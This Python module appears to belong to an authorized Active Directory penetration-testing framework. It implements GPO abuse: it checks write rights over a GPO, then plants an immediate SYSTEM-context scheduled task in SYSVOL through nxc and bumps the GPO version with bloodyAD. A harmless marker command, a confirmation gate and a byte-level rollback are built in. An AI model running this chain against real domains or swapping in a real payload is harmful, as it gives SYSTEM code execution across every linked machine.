"""GPO-ABUSE validation executor -- T3 (ACL / object-takeover edges).

The MOST UNVERIFIED of the 7 T3 recipes (GPO internals -- ``versionNumber``
bump semantics, the Scheduled Tasks Preference XML shape -- are genuinely
intricate; flagged loudly here, not glossed over, the same honesty flag
``certifried.py``/``esc8.py`` already carry for similarly intricate recipes):

    dacledit.py -action read                          (confirm precondition
                                                        GenericAll/GenericWrite
                                                        over the GPO AD object)
    ctx.destructive_confirmer.confirm("gpo_abuse_immediate_task", ...)
                                                        (warn-press-yes, BEFORE
                                                        any SYSVOL write)
    nxc smb <dc> --get-file  SYSVOL\\...\\ScheduledTasks.xml
                                                        (BASELINE snapshot, read
                                                        before any mutation; a
                                                        missing baseline is an
                                                        honest "absent", never
                                                        an error)
    nxc smb <dc> --put-file  <malicious ScheduledTasks.xml>
                                                        (an immediate SYSTEM
                                                        task running a
                                                        harmless, uniquely-
                                                        marked proof command)
    nxc smb <dc> --get-file  (readback -- byte-compare against what was
                              written = "task write confirmed", never the put
                              call's own exit code)
    bloodyAD ... set object <gpo-dn> versionNumber -v <old+1>
                                                        (best-effort bump so
                                                        clients re-pull;
                                                        UNVERIFIED exact
                                                        machine/user-version
                                                        split -- pin in-lab)
    IF linked_host given: bounded poll nxc smb <linked_host> --get-file for
       the marker file the task drops (exercise_ok =
       predicates.file_present_nonempty(<fetched path>) -- literally the
       plan's own formula) -- best-effort, NEVER over-claimed: no linked_host
       -> exercise_ok stays False and an advisory is always attached so the
       weaker (write+version-only) proof is never silently indistinguishable
       from a confirmed one.
    ROLLBACK (byte-identical, the strongest possible confirmation):
       nxc smb <dc> --put-file  the BASELINE bytes back (or a minimal valid
                                 empty skeleton if none existed)
       nxc smb <dc> --get-file  once more, byte-compare against baseline (or
                                 confirm the malicious marker is absent when
                                 no baseline existed)
       bloodyAD ... versionNumber bumped FORWARD again (never decremented --
                                 AD GPO versioning is monotonic; an explicit,
                                 honest limitation, not hidden)

Mutating AND destructive -- FIXED (not conservative like GENERIC-ALL's class-
level flag): an immediate SYSTEM-context scheduled task is a genuine code-exec
side effect the moment a client re-pulls, so the per-call runtime gate
(``ctx.destructive_confirmer``) fires BEFORE any SYSVOL write, the same
contract as ``force_change_password.py``.

Unlike every other T3 recipe's GET/PUT-adjacent proof, this executor does NOT
parse nxc's own (UNVERIFIED) stdout wording to decide file-transfer success --
there is nothing useful to pin in-lab for "did the bytes land" beyond what the
codebase can check directly: GET success is "the local destination file is now
a non-empty file" (``predicates.file_present_nonempty`` -- literally the
plan's own exercise-step formula, reused here for the baseline/write/rollback
GETs too); PUT success is only ever confirmed by a follow-up GET + byte-
compare, mirroring ``openshares.py``'s write-then-readback house style. Only a
hard runner-level failure (``_tool_errored``) is treated as a transport
problem distinct from an honest "remote file absent."

``verified_recipe=False`` (recipe-known, not lab-proven, like every T3
executor).
"""
from __future__ import annotations

import re
import secrets
import time
from pathlib import Path
from typing import Any, Optional

from ..recommend import ParamSpec, ParamValue, values
from ..predicates import file_present_nonempty
from .. import proof
from .. import states
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv, Capability, CAP_NONE)
from .acl_common import dacledit_read_argv, confirm_ace, _RE_ACE_GENERIC_ALL, _RE_ACE_GENERIC_WRITE


# bloodyAD versionNumber set-confirmation marker (same literal/style as
# generic_all.py's _RE_BLOODYAD_SET_OK -- modest duplication, zero
# cross-module coupling, same rationale throughout T3). UNVERIFIED -- pin
# in-lab.
_RE_GPO_VERSION_SET_OK = re.compile(
    r"(successfully (set|updated)|attribute.*(updated|set))", re.I)
# Numeric-extraction only (not a success/failure marker) -- parses a bloodyAD
# attribute-read's echoed value, same spirit as acl_common.py's _RE_OWNER_VALUE.
_RE_GPO_VERSION_VALUE = re.compile(r"versionNumber\s*[:=]\s*(-?\d+)", re.I)

# A minimal, structurally-valid empty ScheduledTasks.xml -- restored in place
# of a baseline that never existed, so rollback always leaves SYSVOL holding a
# well-formed file rather than deleting it outright (UNVERIFIED precise clsid
# convention -- pin in-lab, same flag as the rest of this module).
_GPO_EMPTY_SKELETON = (
    b'<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">'
    b'</ScheduledTasks>'
)


def _tool_errored(res: RunResult) -> bool:
    return bool(res.error) or res.timed_out or res.returncode is None


def _domain_dn(domain: str) -> str:
    """``north.sevenkingdoms.local`` -> ``DC=north,DC=sevenkingdoms,DC=local``."""
    return ",".join(f"DC={label}" for label in (domain or "").split(".") if label)


def _gpo_dn(gpo_guid: str, domain: str) -> str:
    return f"CN={{{(gpo_guid or '').strip('{}')}}},CN=Policies,CN=System,{_domain_dn(domain)}"


def _sysvol_tasks_unc(domain: str, gpo_guid: str) -> str:
    guid = (gpo_guid or "").strip("{}")
    return (f"SYSVOL\\{domain}\\Policies\\{{{guid}}}\\Machine\\Preferences\\"
            "ScheduledTasks\\ScheduledTasks.xml")


def _nxc_auth_flags(cfg) -> list[str]:
    argv = ["-u", cfg.username or ""]
    if cfg.nt_hash:
        argv += ["-H", cfg.nt_hash]
    elif cfg.aes_key:
        argv += ["--aesKey", cfg.aes_key]
    elif cfg.password is not None:
        argv += ["-p", cfg.password]
    return argv


def _bloodyad_auth_argv(cfg, dc: str) -> list[str]:
    argv = ["bloodyAD", "-d", cfg.domain, "-u", cfg.username or ""]
    if cfg.nt_hash:
        argv += ["-H", cfg.nt_hash]
    elif cfg.password is not None:
        argv += ["-p", cfg.password]
    argv += ["--host", dc]
    return argv


def _task_xml(marker: str) -> bytes:
    """A harmless, uniquely-marked proof task -- never a real payload."""
    return (
        '<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">'
        '<ImmediateTaskV2 clsid="{9756CCD6-41D8-4387-99CD-E29E29A27D39}" '
        f'name="t3_gpo_abuse_{marker}" image="0">'
        '<Properties action="C" name="t3_gpo_abuse" runAs="NT AUTHORITY\\SYSTEM">'
        '<Task version="1.2"><Actions Context="Author"><Exec>'
        '<Command>cmd.exe</Command>'
        f'<Arguments>/c whoami &gt; C:\\Windows\\Temp\\t3_gpo_abuse_{marker}.txt'
        '</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>'
        '</ScheduledTasks>'
    ).encode("utf-8")


class GpoAbuseExecutor(ValidationExecutor):
    technique = "GPO-ABUSE"
    technique_class = "acl"
    terminal_kind = "file_write_readback"
    mutating = True
    destructive = True
    verified_recipe = False
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_ACL_CONTROL})
    recipe_ref = ("T3 GPO-ABUSE = dacledit read (confirm precondition GenericAll/"
                  "GenericWrite over the GPO AD object) ; DESTRUCTIVE-CONFIRM gate "
                  "; nxc --get-file baseline ScheduledTasks.xml (absent is honest, "
                  "not an error) ; nxc --put-file malicious immediate SYSTEM task ; "
                  "nxc --get-file readback = task write confirmed ; bloodyAD bump "
                  "versionNumber (best-effort) ; best-effort exercise poll if "
                  "linked_host given ; ROLLBACK byte-identical restore + versionNumber "
                  "bumped forward again (monotonic, never decremented) (recipe-known, "
                  "NOT lab-proven, the most UNVERIFIED of the 7)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        entity = finding.entity or {}
        return [
            ParamSpec(
                name="gpo_guid", kind="free",
                description="The GPO's GUID (with or without braces). Requires an "
                            "already-held GenericAll/GenericWrite ACE over its AD "
                            "object. DESTRUCTIVE -- deploys a SYSTEM-context "
                            "scheduled task to every computer the GPO links to.",
                recommended=entity.get("gpo_guid") or "",
                rationale="The GPO identifier of the aranum ACL finding.",
                required=True,
            ),
            ParamSpec(
                name="dc_host", kind="target_host",
                description="The domain controller SYSVOL is read/written through.",
                recommended=ctx.config.dc_ip,
                rationale="The configured DC -- already the SYSVOL owner for every "
                          "other T3/FULL recipe's own DC-IP default.",
                required=True,
            ),
            ParamSpec(
                name="linked_host", kind="target_host",
                description="One machine linked to the GPO, used ONLY to "
                            "best-effort VERIFY the task actually ran there. The "
                            "technique still fires without it, with a narrower "
                            "proof (task write + versionNumber bump only -- "
                            "execution never independently confirmed).",
                recommended=entity.get("linked_host") or "",
                rationale="Optional -- the aranum finding's own linked-computer "
                          "fact, if any.",
                required=False,
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        gpo_guid = params["gpo_guid"].value or ""
        return {"domain": ctx.config.domain, "gpo_guid": gpo_guid}

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = v["dc_host"] or ctx.config.dc_ip
        gpo_dn = _gpo_dn(v["gpo_guid"], ctx.config.domain)
        unc = _sysvol_tasks_unc(ctx.config.domain, v["gpo_guid"])
        lines = [
            f"dacledit.py -action read -target '{gpo_dn}' -dc-ip {dc} <auth>  "
            "(confirm precondition GenericAll/GenericWrite over the GPO object)",
            "*** DESTRUCTIVE: warn-press-yes confirmation required (code-exec "
            "side effect) ***",
            f"nxc smb {dc} <auth> --get-file '{unc}' <out_dir>/baseline_tasks.xml  "
            "(BASELINE snapshot -- absent is honest, not an error)",
            f"nxc smb {dc} <auth> --put-file <out_dir>/malicious_tasks.xml '{unc}'  "
            "(immediate SYSTEM task, harmless uniquely-marked proof command)",
            f"nxc smb {dc} <auth> --get-file '{unc}' <readback>  (byte-compare = "
            "task write confirmed)",
            f"bloodyAD ... --host {dc} set object '{gpo_dn}' versionNumber -v "
            "<old+1>  (best-effort bump, UNVERIFIED machine/user-version split)",
        ]
        if v["linked_host"]:
            lines.append(f"bounded poll: nxc smb {v['linked_host']} <auth> "
                         "--get-file the marker file  (best-effort execution "
                         "confirmation)")
        else:
            lines.append("no linked_host -> execution NOT independently "
                         "confirmed (advisory attached)")
        lines.append("ROLLBACK: byte-identical restore of baseline (or empty "
                     "skeleton) + versionNumber bumped forward again "
                     "(monotonic, never decremented)")
        return lines

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        gpo_guid = v["gpo_guid"]
        dc = v["dc_host"] or cfg.dc_ip
        linked_host = v["linked_host"] or ""
        gpo_dn = _gpo_dn(gpo_guid, cfg.domain)
        unc = _sysvol_tasks_unc(cfg.domain, gpo_guid)
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        # 1) confirm the PRECONDITION ACE over the GPO's AD object -----------
        read_argv = dacledit_read_argv(cfg, gpo_dn, dc)
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        read_text = (res.stdout or "") + (res.stderr or "")
        confirmed = confirm_ace(res, read_text, trustee=cfg.username or "",
                               right_res=(_RE_ACE_GENERIC_ALL, _RE_ACE_GENERIC_WRITE))
        record("confirm_precondition", read_argv, res, confirmed is not False,
              note="precondition confirmed" if confirmed else
                   ("precondition insufficient" if confirmed is False else "unconfirmed"))
        if confirmed is False:
            errors.append("gpo_abuse_not_confirmed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if confirmed is None:
            errors.append("advisory:gpo_abuse_unconfirmed_attempting_anyway")

        # 2) DESTRUCTIVE-CONFIRM gate -- BEFORE any SYSVOL write ---------------
        detail = {"gpo": gpo_guid, "linked_host": linked_host}
        approved = ctx.destructive_confirmer.confirm("gpo_abuse_immediate_task", detail)
        if not approved:
            gate["classifier"] = "denied"
            gate["op"] = "gpo_abuse_immediate_task"
            errors.append("gate_denied:gpo_abuse_immediate_task")
            return self._artifact(steps, gate, mutation, None, False, errors)
        gate["classifier"] = "approved"
        gate["op"] = "gpo_abuse_immediate_task"

        # 3) BASELINE snapshot -- read BEFORE any mutation; absent is an
        #    honest outcome, never an error (a GPO need not already have a
        #    ScheduledTasks.xml) --------------------------------------------
        baseline_path = out_dir / "baseline_tasks.xml"
        base_get_argv = ["nxc", "smb", dc, *_nxc_auth_flags(cfg),
                        "--get-file", unc, str(baseline_path)]
        res = ctx.runner.run(base_get_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        baseline_existed = file_present_nonempty(str(baseline_path))
        baseline_bytes = baseline_path.read_bytes() if baseline_existed else None
        record("baseline_snapshot", base_get_argv, res, not _tool_errored(res),
              note=(f"baseline present ({len(baseline_bytes)} bytes)" if baseline_existed
                    else "baseline absent (no existing ScheduledTasks.xml)"))

        # 4) write the malicious ScheduledTasks.xml (an immediate SYSTEM task
        #    running a harmless, uniquely-marked proof command) + immediate
        #    readback-and-byte-compare = "task write confirmed" (never the
        #    put call's own exit code / UNVERIFIED stdout wording) ----------
        marker = secrets.token_hex(8)
        malicious_bytes = _task_xml(marker)
        malicious_path = out_dir / "malicious_tasks.xml"
        malicious_path.write_bytes(malicious_bytes)
        put_argv = ["nxc", "smb", dc, *_nxc_auth_flags(cfg),
                   "--put-file", str(malicious_path), unc]
        res = ctx.runner.run(put_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        put_ran = not _tool_errored(res)
        record("write_malicious_task", put_argv, res, put_ran,
              note="put issued" if put_ran else "put call errored")

        write_readback_path = out_dir / "write_readback_tasks.xml"
        get_argv = ["nxc", "smb", dc, *_nxc_auth_flags(cfg),
                   "--get-file", unc, str(write_readback_path)]
        res = ctx.runner.run(get_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        task_write_confirmed = (file_present_nonempty(str(write_readback_path))
                                and write_readback_path.read_bytes() == malicious_bytes)
        record("confirm_task_write", get_argv, res, task_write_confirmed,
              note="task write confirmed (byte-identical readback)"
                   if task_write_confirmed else "task write NOT confirmed")
        if not task_write_confirmed:
            errors.append("gpo_abuse_task_write_not_confirmed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        mutation["applied"] = True

        # 5) bump versionNumber so clients re-pull (best-effort; UNVERIFIED
        #    exact machine/user-version split -- pin in-lab) ------------------
        _old_version, version_set_ok = self._bump_version(ctx, cfg, dc, gpo_dn,
                                                           steps, errors, record)

        # 6) best-effort exercise, never over-claimed --------------------------
        exercise_ok = False
        if linked_host:
            exercise_ok = self._poll_exercise(ctx, cfg, linked_host, marker,
                                              out_dir, record)
        else:
            errors.append("advisory:no_linked_host_exercise_not_confirmed")

        ok = exercise_ok if linked_host else bool(task_write_confirmed and version_set_ok)
        predicate = (f"deployed an immediate SYSTEM-context scheduled task via a "
                    f"writable GPO ({gpo_guid})" +
                    (f" linked to {linked_host}, execution confirmed" if exercise_ok
                     else " -- execution not independently confirmed"))
        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=ok, predicate=predicate,
            proof_token=proof.proof_token(
                "GPO-ABUSE", cfg.domain, gpo_guid, linked_host or "",
                "task_confirmed" if exercise_ok else "task_deployed_unconfirmed"),
            extra={"gpo_guid": gpo_guid, "linked_host": linked_host or None},
        )

        # 7) rollback: byte-identical restore + versionNumber bumped forward
        #    again (monotonic, never decremented) -----------------------------
        self._rollback(ctx, cfg, dc, gpo_dn, unc, marker, baseline_existed,
                       baseline_bytes, mutation, steps, errors, record)

        complete = bool(ok and mutation["rollback"]["performed"])
        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

    # ---------------------------------------------------------------- composition (C)
    def produced(self, ctx, finding, params, artifact) -> list[Capability]:
        gpo_guid = params["gpo_guid"].value or ""
        linked_host = params["linked_host"].value or ""
        if not artifact.get("complete"):
            return []
        principal = linked_host or gpo_guid
        return [Capability(state=states.control_for(principal), channel=CAP_NONE,
                           principal=principal)]

    # ---------------------------------------------------------------- helpers
    def _bump_version(self, ctx, cfg, dc, gpo_dn, steps, errors,
                      record) -> tuple[Optional[int], bool]:
        """Read the current versionNumber (best-effort) and bump it +1.

        Returns ``(the value actually read, whether the SET call reported
        success)``. UNVERIFIED -- the exact machine/user-version split is not
        modeled; pin in-lab (flagged explicitly in the module docstring). An
        unreadable baseline value never blocks the bump -- it is attempted
        from ``0`` with an advisory, same fail-open spirit as every other
        precondition in this codebase.
        """
        get_argv = _bloodyad_auth_argv(cfg, dc) + ["get", "object", gpo_dn,
                                                    "--attr", "versionNumber"]
        res = ctx.runner.run(get_argv, timeout=cfg.tool_timeout_s)
        text = (res.stdout or "") + (res.stderr or "")
        m = _RE_GPO_VERSION_VALUE.search(text) if not _tool_errored(res) else None
        current = int(m.group(1)) if m else None
        record("read_version_number", get_argv, res, current is not None,
              note=f"versionNumber={current}" if current is not None
                   else "versionNumber unreadable")
        if current is None:
            errors.append("advisory:gpo_baseline_version_unreadable_bump_best_effort")
        new_version = (current or 0) + 1
        set_argv = _bloodyad_auth_argv(cfg, dc) + ["set", "object", gpo_dn,
                                                   "versionNumber", "-v", str(new_version)]
        res = ctx.runner.run(set_argv, timeout=cfg.tool_timeout_s)
        set_out = (res.stdout or "") + (res.stderr or "")
        set_ok = bool(_RE_GPO_VERSION_SET_OK.search(set_out))
        record("bump_version_number", set_argv, res, set_ok,
              note=f"versionNumber -> {new_version}" if set_ok else "version bump failed")
        return (current, set_ok)

    def _poll_exercise(self, ctx, cfg, linked_host, marker, out_dir, record) -> bool:
        """Best-effort, bounded poll for the marker file the deployed task
        drops. NEVER over-claimed: a timeout is an honest "not confirmed",
        never a failure of the technique itself (see module docstring).
        Bounded exactly like ``process_manager.py``'s own ``poll_for_capture``
        loop, just without the ``ProcessManager`` chassis -- this is a short,
        fire-each-iteration SMB check, not a long-running listener (plan §2.7).
        """
        marker_path = out_dir / f"exercise_marker_{marker}.txt"
        get_argv = ["nxc", "smb", linked_host, *_nxc_auth_flags(cfg), "--get-file",
                   f"C:\\Windows\\Temp\\t3_gpo_abuse_{marker}.txt", str(marker_path)]
        start = time.monotonic()
        while True:
            res = ctx.runner.run(get_argv, timeout=cfg.tool_timeout_s)
            if file_present_nonempty(str(marker_path)):
                record("exercise_poll", get_argv, res, True,
                      note=f"marker confirmed on {linked_host}")
                return True
            if time.monotonic() - start >= cfg.tool_timeout_s:
                record("exercise_poll", get_argv, res, False,
                      note=f"marker not observed on {linked_host} within "
                           f"{cfg.tool_timeout_s}s (bounded, honest no-capture)")
                return False
            time.sleep(cfg.poll_interval_s)

    # ---------------------------------------------------------------- rollback
    def _rollback(self, ctx, cfg, dc, gpo_dn, unc, marker, baseline_existed,
                  baseline_bytes, mutation, steps, errors, record) -> None:
        if not mutation["applied"]:
            return
        out_dir = Path(ctx.output_dir)
        if ctx.authorizer.authorize("rollback", {"gpo_dn": gpo_dn}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = ("nxc byte-identical SYSVOL restore + "
                                          "bloodyAD versionNumber bumped forward "
                                          "again (monotonic, never decremented)")

        restore_bytes = baseline_bytes if baseline_existed else _GPO_EMPTY_SKELETON
        restore_source = out_dir / "restore_source_tasks.xml"
        restore_source.write_bytes(restore_bytes)
        put_argv = ["nxc", "smb", dc, *_nxc_auth_flags(cfg),
                   "--put-file", str(restore_source), unc]
        res = ctx.runner.run(put_argv, timeout=cfg.tool_timeout_s)
        put_ran = not _tool_errored(res)
        record("rollback_restore_put", put_argv, res, put_ran,
              note="baseline restored" if baseline_existed else
                   "empty skeleton restored (no baseline existed)")

        restore_readback = out_dir / "restore_readback_tasks.xml"
        get_argv = ["nxc", "smb", dc, *_nxc_auth_flags(cfg),
                   "--get-file", unc, str(restore_readback)]
        res = ctx.runner.run(get_argv, timeout=cfg.tool_timeout_s)
        restored_bytes = (restore_readback.read_bytes()
                          if file_present_nonempty(str(restore_readback)) else None)
        bind_ok = restored_bytes is not None
        if baseline_existed:
            verified = bool(bind_ok and restored_bytes == baseline_bytes)
        else:
            verified = bool(bind_ok and marker.encode("utf-8") not in restored_bytes)
        record("rollback_verify_readback", get_argv, res, verified,
              note="byte-identical restore confirmed" if verified
                   else "restore not confirmed (unverified)")

        # versionNumber bumped FORWARD again -- monotonic AD GPO versioning
        # means it can never be decremented back to the pre-run value; stated
        # as an explicit, honest limitation, never hidden.
        self._bump_version(ctx, cfg, dc, gpo_dn, steps, errors, record)
        errors.append("advisory:gpo_version_number_not_reverted_monotonic_versioning")

        mutation["rollback"]["verified"] = verified
        if not verified:
            errors.append("rollback_unverified")

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
